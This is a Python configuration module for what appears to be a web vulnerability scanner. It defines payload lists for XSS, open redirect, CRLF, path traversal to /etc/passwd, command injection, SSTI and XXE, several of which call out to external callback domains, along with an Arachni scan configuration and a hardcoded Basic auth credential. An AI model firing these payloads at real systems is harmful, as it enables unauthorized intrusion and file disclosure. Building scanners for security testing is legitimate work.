#!/usr/bin/env python
# coding=utf-8

import logging
from sqlalchemy import *
from sqlalchemy.orm import scoped_session
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base
import sys
import pymysql


reload(sys)
sys.setdefaultencoding("utf8")


# referer:  http://www.jianshu.com/p/feb86c06c4f4
# create logger
logging.getLogger("requests").setLevel(logging.WARNING)
logger = logging.getLogger("test")
logger.setLevel(logging.INFO)

# create handler
filehandler = logging.FileHandler("logtest.log", mode="w", encoding="utf-8", delay=False)
streamhandler = logging.StreamHandler()

# create format
formatter = logging.Formatter("[%(asctime)s] [%(filename)s] [%(lineno)d] %(message)s")

# add formatter to handler
filehandler.setFormatter(formatter)
streamhandler.setFormatter(formatter)

# set hander to logger
logger.addHandler(filehandler)
logger.addHandler(streamhandler)



DSN = "mysql+pymysql://root:@127.0.0.1/wyproxy?charset=utf8"
engine = create_engine(DSN, echo=True)
metadata = MetaData(bind=engine)
Base = declarative_base(metadata=metadata)

Session = scoped_session(sessionmaker(bind=engine))


class VULNS(Base):
    __table__ = Table('vulns', metadata, autoload=True)


def save_to_databases(data, arachni=False):
    session = Session()
    print "======================"
    print data
    print "====================="
    if arachni:
        #arachni result is [(),()]
        # print type(data)
        if type(data) is list:
            for d in data:
                print d
                try:
                    obj = VULNS(
                        url = d[0],
                        method = d[1],
                        parameters = d[2],
                        headers_string = d[3],
                        delta_time = d[4],
                        vuln_name = d[5],
                        severity = d[6],
                        checks = d[7],
                        proof = d[8],
                        seed = d[9],
                        )
                    session.add(obj)
                    session.commit()
                except Exception as e:
                    logger.error("[save_to_database] [error={}]".format(repr(e)))
                    session.rollback()
        else:
            # logger.error(..)
            pass
    else:
        url = data["url"]
        method = data["method"]
        param = data["param"]
        vuln_name = data["type"]
        obj = VULNS(
            url = url,
            method=method,
            parameters = param,
            vuln_name = vuln_name,
        )
        try:
            session.add(obj)
            session.commit()
        except Exception as e:
            logger.error("[data_to_database] [arachni=False] [reason={}]".format(repr(e)))
            session.rollback()
    session.close()



XSS_Rule = {
    "script":[
        "`';!--\"<XSS>=&{()}",
        "&\"]}alert();{//",
        "\"'><svg onload=confirm()1)>",
        "<svg onload=alert(1)>",
        "\" onfous=alert(1)\"><\"", # 事件
        "<video><source onerror=\"alert(1)\">", # H5 payload
        "</textarea>'\"});<script src=http://xss.niufuren.cc/QHDPCg?1526457930></script>"
    ],
}

USR_Rule = {
    "redirect":[
        'http://www.niufuren.cc/usr.txt', #  Valar Morghulis
        '@www.nifuren.cc/%2f..',
        '//jd.com@www.niufuren.cc/usr.txt'
    ],
}
CRLF_Rule = {
    "redirect":[
        '%0d%0acrlftest:%20crlftestvalue%0d%0a%0d%0a', #  Valar Morghulis
        '\ncrlftest: crlftestvalue\n\n',
        '\r\ncrlftest: crlftestvalue\r\n\r\n',
    ],
}

LFI_Rule = {
    "lfi":[
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",#    {tag="root:x:"}
        "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",#                    {tag="root:x:"}
        "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",#    {tag="root:x:"}
        "/././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
        "/etc/passwd", #    {tag="root:x:"}
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",#    {tag="root:x:"}
        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",#                    {tag="root:x:"}
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",#    {tag="root:x:"}
        # "././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
        # "/etc/passwd", #    {tag="root:x:"}
        # 还可以加入RFI
    ],
}


command_injection_payloads = [
    ";nslookup ci_{domain}.devil.yoyostay.top",
    '&nslookup ci_{domain}.devil.yoyostay.top&\'\\"`0&nslookup ci_{domain}.devil.yoyostay.top&`\'',
    "nslookup ci_{domain}.devil.yoyostay.top|nslookup ci_{domain}.devil.yoyostay.top&nslookup ci_{domain}.devil.yoyostay.top",
    ";nslookup ci_{domain}.devil.yoyostay.top|nslookup ci_{domain}.devil.yoyostay.top&nslookup ci_{domain}.devil.yoyostay.top;"
    "$(nslookup ci_{domain}.devil.yoyostay.top)",
    "';nslookup ci_{domain}.devil.yoyostay.top'",
    "'&nslookup ci_{domain}.devil.yoyostay.top'",
    "'|nslookup ci_{domain}.devil.yoyostay.top'",
    "'||nslookup ci_{domain}.devil.yoyostay.top'",
    "'$(nslookup ci_{domain}.devil.yoyostay.top)'",
    "\";nslookup ci_{domain}.devil.yoyostay.top\"",
    "\"&nslookup ci_{domain}.devil.yoyostay.top\"",
    "\"|nslookup ci_{domain}.devil.yoyostay.top\"",
    "\"||nslookup ci_{domain}.devil.yoyostay.top\"",
    "\"$(nslookup ci_{domain}.devil.yoyostay.top)\""
]


ssti_payload = ["{{159753 * 357951}}", "${{159753 * 357951}}"]

arachni_domain = "http://127.0.0.1:7331"
arachni_headers =  {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
        "Authorization" : "Basic YXJhY2huaTEyMzphcmFjaG5pMTIz",
        "Content-Type": 'application/json',
        "Connection" : "close"
    }


arachni_timeout = 30 * 60

#arachni_options = {
ARACHNI_OPTIONS = {
    "url" : "",
    "http" : {
        #"user_agent" : "Arachni/",
        "user_agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Security Scan",
        "request_timeout" : 3600,
        "request_redirect_limit" : 5,
        "request_concurrency" : 10,
        "request_queue_size" : 100,
        "request_headers" : {},
        "response_max_size" : 500000,
        # "cookie_string" : ""
    },
    "audit" : {
        "elements": ["links", "forms", "cookies", "headers", "jsons", "xmls", "ui_inputs", "ui_forms"]
        # "parameter_values" : True,
        # # "exclude_vector_patterns" : [],
        # # "include_vector_patterns" : [],
        # # "link_templates" : [],
        # "forms" : True,
        # "cookies" : True,
        # "headers" : True,
        # "links" : True
    },
    "input" : {
        "values" : {},
        "default_values" : {
          "(?i-mx:name)" : "what_ever_a@163.com",
          "(?i-mx:user)" : "what_ever_a@163.com",
          "(?i-mx:usr)" : "what_ever_a@163.com",
          "(?i-mx:pass)" : "whatever",
          "(?i-mx:txt)" : "arachni_text",
          "(?i-mx:num)" : "132",
          "(?i-mx:amount)" : "100",
          "(?i-mx:mail)" : "arachni@email.gr",
          "(?i-mx:account)" : "12",
          "(?i-mx:id)" : "1"
        },
        "without_defaults" : False,
        "force" : False
    },
    "browser_cluster" : {
        # "wait_for_elements" : {},
        "pool_size" : 3,
        # "job_timeout" : 25,
        # "worker_time_to_live" : 100,
        "ignore_images" : True,
        # "screen_width" : 1600,
        # "screen_height" : 1200
    },
    "scope" : {
        "redundant_path_patterns" : {},
        "dom_depth_limit" : 5,
        "exclude_path_patterns" : ["logout",],
        "exclude_content_patterns" : [],
        "include_path_patterns" : [],
        "restrict_paths" : [],
        "extend_paths" : ["logout"],
        "url_rewrites" : {},
        "page_limit" : 2
        # "directory_depth_list" : 3,
    },
    "session" : {},
    "checks" : [
        "backdoors",
        "backup_directories",
        "backup_files",
        "code_injection",
        "code_injection_php_input_wrapper",
        "code_injection_timing",
        "common_admin_interfaces",
        "cookie_set_for_parent_domain",
        "csrf",
        "cvs_svn_users",
        "directory_listing",
        "file_inclusion",
        "htaccess_limit",
        "html_objects",
        "insecure_client_access_policy",
        "insecure_cors_policy",
        "insecure_cross_domain_policy_headers",
        "ldap_injection",
        "localstart_asp",
        "mixed_resource",
        "no_sql_injection",
        "no_sql_injection_differential",
        "origin_spoof_access_restriction_bypass",
        "os_cmd_injection",
        "os_cmd_injection_timing",
        "path_traversal",
        "private_ip",
        "response_splitting",
        "rfi",
        "sql_injection",
        "sql_injection_differential",
        "sql_injection_timing",
        "ssn",
        "trainer",
        "unencrypted_password_forms",
        "unvalidated_redirect",
        "unvalidated_redirect_dom",
        "webdav",
        "xpath_injection",
        "xss",
        "xss_dom",
        "xss_dom_script_context",
        "xss_event",
        "xss_path",
        "xss_script_context",
        "xss_tag",
        "xst",
        "xxe"
    ],
      # "checks" : ["xss*", "sql*", "code*", "common*", "nosql*", "path_traversal", "Rfi*", "Xxe*", "oscmd*", "unvalidated_redirect*"],
      # "checks" : [],
    "platforms" : [],
    "plugins" : {},
    "no_fingerprinting" : False,
    "authorized_by" : None
}



XXE_payload =  '<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "http://xxeproxy_{domain}.devil.yoyostay.top"> ]> <r>&sp;</r>'
